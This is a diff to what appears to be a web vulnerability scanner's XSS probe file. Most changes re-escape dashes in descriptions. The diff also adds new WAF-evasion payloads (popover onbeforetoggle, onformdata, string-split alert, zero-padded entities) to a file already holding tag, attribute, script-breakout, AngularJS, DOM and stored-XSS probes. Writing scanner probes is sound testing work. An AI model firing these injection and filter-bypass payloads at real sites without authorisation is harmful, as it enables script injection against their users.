@@ -12,7 +12,7 @@
   ],
   "contexts": {
     "html": {
-      "description": "Reflected XSS probes for HTML body context — tests raw tag injection and script execution",
+      "description": "Reflected XSS probes for HTML body context \u2014 tests raw tag injection and script execution",
       "tech_match": [],
       "param_match": [
         "search",
@@ -30,7 +30,7 @@
       "probes": [
         {
           "payload": "<swk{{marker}}>",
-          "description": "Unique marker tag injection — reflection of <swkXXXX> confirms unescaped HTML context (won't match natural tags)",
+          "description": "Unique marker tag injection \u2014 reflection of <swkXXXX> confirms unescaped HTML context (won't match natural tags)",
           "matchers": [
             {
               "type": "reflection",
@@ -70,7 +70,7 @@
       ]
     },
     "attribute": {
-      "description": "Reflected XSS probes targeting HTML attribute context — breaks out of quoted attributes to inject event handlers",
+      "description": "Reflected XSS probes targeting HTML attribute context \u2014 breaks out of quoted attributes to inject event handlers",
       "tech_match": [],
       "param_match": [
         "search",
@@ -128,7 +128,7 @@
       ]
     },
     "angular": {
-      "description": "AngularJS template injection probes — tests server-side or client-side Angular expression evaluation",
+      "description": "AngularJS template injection probes \u2014 tests server-side or client-side Angular expression evaluation",
       "tech_match": [
         "AngularJS"
       ],
@@ -148,7 +148,7 @@
       "probes": [
         {
           "payload": "{{7*7}}",
-          "description": "Angular expression evaluation probe — 49 confirms SSTI or client-side template injection",
+          "description": "Angular expression evaluation probe \u2014 49 confirms SSTI or client-side template injection",
           "matchers": [
             {
               "type": "word",
@@ -194,7 +194,7 @@
       ]
     },
     "javascript_context": {
-      "description": "XSS probes for injection inside existing <script> blocks — breaks out of string literals or script tags to execute attacker-controlled JavaScript",
+      "description": "XSS probes for injection inside existing <script> blocks \u2014 breaks out of string literals or script tags to execute attacker-controlled JavaScript",
       "tech_match": [],
       "param_match": [
         "callback",
@@ -207,7 +207,7 @@
       "probes": [
         {
           "payload": "\";alert(1)//",
-          "description": "Double-quote string breakout inside script block — closes string, injects alert, comments out rest of line",
+          "description": "Double-quote string breakout inside script block \u2014 closes string, injects alert, comments out rest of line",
           "matchers": [
             {
               "type": "reflection",
@@ -220,7 +220,7 @@
         },
         {
           "payload": "'-alert(1)-'",
-          "description": "Single-quote string breakout with arithmetic context — subtraction operator forces alert execution as expression",
+          "description": "Single-quote string breakout with arithmetic context \u2014 subtraction operator forces alert execution as expression",
           "matchers": [
             {
               "type": "reflection",
@@ -233,7 +233,7 @@
         },
         {
           "payload": "</script><script>alert(1)</script>",
-          "description": "Script tag breakout — closes existing script block and opens a new one with attacker-controlled code",
+          "description": "Script tag breakout \u2014 closes existing script block and opens a new one with attacker-controlled code",
           "matchers": [
             {
               "type": "reflection",
@@ -247,7 +247,7 @@
       ]
     },
     "dom_based": {
-      "description": "DOM XSS probes targeting client-side sinks — javascript: href injection, img onerror, and Angular constructor chain",
+      "description": "DOM XSS probes targeting client-side sinks \u2014 javascript: href injection, img onerror, and Angular constructor chain",
       "tech_match": [],
       "param_match": [
         "search",
@@ -269,7 +269,7 @@
       "probes": [
         {
           "payload": "javascript:alert(1)",
-          "description": "javascript: pseudo-protocol in href/src — triggers in DOM sinks that set href without sanitisation",
+          "description": "javascript: pseudo-protocol in href/src \u2014 triggers in DOM sinks that set href without sanitisation",
           "matchers": [
             {
               "type": "reflection",
@@ -282,7 +282,7 @@
         },
         {
           "payload": "<img src=x onerror=alert(document.domain)>",
-          "description": "img onerror DOM XSS probe using document.domain — confirms execution context",
+          "description": "img onerror DOM XSS probe using document.domain \u2014 confirms execution context",
           "matchers": [
             {
               "type": "reflection",
@@ -295,7 +295,7 @@
         },
         {
           "payload": "{{constructor.constructor('alert(1)')()}}",
-          "description": "AngularJS sandbox escape via constructor chain — function in response or reflection confirms injection",
+          "description": "AngularJS sandbox escape via constructor chain \u2014 function in response or reflection confirms injection",
           "matchers": [
             {
               "type": "word",
@@ -316,7 +316,7 @@
       ]
     },
     "stored_indicator": {
-      "description": "Stored XSS indicator payloads — unique markers designed to survive persistence and be detected on a different page",
+      "description": "Stored XSS indicator payloads \u2014 unique markers designed to survive persistence and be detected on a different page",
       "tech_match": [],
       "param_match": [
         "comment",
@@ -333,7 +333,7 @@
       "probes": [
         {
           "payload": "<b>xss_stored_{{marker}}</b>",
-          "description": "Benign bold tag with unique marker — look for reflection on a DIFFERENT page to confirm stored XSS",
+          "description": "Benign bold tag with unique marker \u2014 look for reflection on a DIFFERENT page to confirm stored XSS",
           "matchers": [
             {
               "type": "reflection",
@@ -346,7 +346,7 @@
         },
         {
           "payload": "\"><img src=x onerror=alert({{marker}})>",
-          "description": "Attribute breakout + stored onerror probe — marker reflection on another page confirms stored XSS",
+          "description": "Attribute breakout + stored onerror probe \u2014 marker reflection on another page confirms stored XSS",
           "matchers": [
             {
               "type": "reflection",
@@ -360,7 +360,7 @@
       ]
     },
     "waf_bypass": {
-      "description": "WAF evasion XSS payloads from PayloadsAllTheThings — case mixing, string concat, unicode escapes, self-closing tags",
+      "description": "WAF evasion XSS payloads from PayloadsAllTheThings \u2014 case mixing, string concat, unicode escapes, self-closing tags",
       "tech_match": [],
       "param_match": [
         "search",
@@ -378,7 +378,7 @@
       "probes": [
         {
           "payload": "<svg/onload=alert(1)//",
-          "description": "SVG onload with trailing double-slash comment — bypasses filters that require closing > bracket",
+          "description": "SVG onload with trailing double-slash comment \u2014 bypasses filters that require closing > bracket",
           "matchers": [
             {
               "type": "reflection",
@@ -391,7 +391,7 @@
         },
         {
           "payload": "<details open ontoggle=alert(1)>",
-          "description": "HTML5 details element ontoggle — auto-fires on page load without user interaction",
+          "description": "HTML5 details element ontoggle \u2014 auto-fires on page load without user interaction",
           "matchers": [
             {
               "type": "reflection",
@@ -404,7 +404,7 @@
         },
         {
           "payload": "<img src=x onerror=window['al'+'ert'](1)>",
-          "description": "String concatenation WAF bypass — splits alert keyword to evade static keyword filters",
+          "description": "String concatenation WAF bypass \u2014 splits alert keyword to evade static keyword filters",
           "matchers": [
             {
               "type": "reflection",
@@ -417,7 +417,7 @@
         },
         {
           "payload": "<img src=x onerror=\\u0061lert(1)>",
-          "description": "Unicode escape WAF bypass — \\u0061 = 'a', bypasses filters matching literal 'alert'",
+          "description": "Unicode escape WAF bypass \u2014 \\u0061 = 'a', bypasses filters matching literal 'alert'",
           "matchers": [
             {
               "type": "reflection",
@@ -430,7 +430,7 @@
         },
         {
           "payload": "<ScRiPt>{{marker}}</ScRiPt>",
-          "description": "Mixed case script tag — bypasses case-sensitive keyword blacklists",
+          "description": "Mixed case script tag \u2014 bypasses case-sensitive keyword blacklists",
           "matchers": [
             {
               "type": "reflection",
@@ -443,7 +443,7 @@
         },
         {
           "payload": "<svg><script>alert&#40;1&#41;</script>",
-          "description": "HTML entity encoding inside SVG script — bypasses filters checking for raw parentheses",
+          "description": "HTML entity encoding inside SVG script \u2014 bypasses filters checking for raw parentheses",
           "matchers": [
             {
               "type": "reflection",
@@ -456,7 +456,59 @@
         },
         {
           "payload": "<body onload=alert(1)>",
-          "description": "Body onload injection — effective when input is injected near the top of the page body",
+          "description": "Body onload injection \u2014 effective when input is injected near the top of the page body",
+          "matchers": [
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "<button popovertarget=x onbeforetoggle=alert(1)>x</button><div id=x popover>",
+          "description": "Popover API onbeforetoggle handler \u2014 fires without click; bypasses filters blocking on*=/onclick",
+          "matchers": [
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "<form onformdata=alert(1)><input><button>x",
+          "description": "onformdata event handler \u2014 newer sink often missing from WAF allowlists",
+          "matchers": [
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "<img src onerror=window['al'+'ert'](1)>",
+          "description": "String-split keyword evasion via bracket-property access \u2014 defeats 'alert(' signature",
+          "matchers": [
+            {
+              "type": "reflection",
+              "check_variants": true
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "<img src=x onerror=alert&#0000000040;document.domain&#0000000041;>",
+          "description": "HTML decimal-entity with leading zeros for ( ) \u2014 bypasses filters matching literal parentheses",
           "matchers": [
             {
               "type": "reflection",
@@ -663,7 +715,7 @@
       ]
     },
     "chatbot_dom_sink_2025": {
-      "description": "Chatbot / chat UI DOM XSS — input fields with placeholder *chat* / data-testid *chat* render via innerHTML / jQuery.html. 2025 AWVS context.",
+      "description": "Chatbot / chat UI DOM XSS \u2014 input fields with placeholder *chat* / data-testid *chat* render via innerHTML / jQuery.html. 2025 AWVS context.",
       "tech_match": [],
       "param_match": [
         "message",
@@ -673,7 +725,7 @@
       "probes": [
         {
           "payload": "<img src=x onerror=alert(1)>",
-          "description": "Submit <img onerror> to chat input — reflected via DOM sink (innerHTML/insertAdjacentHTML/jQuery.html)",
+          "description": "Submit <img onerror> to chat input \u2014 reflected via DOM sink (innerHTML/insertAdjacentHTML/jQuery.html)",
           "matchers": [
             {
               "type": "reflection",
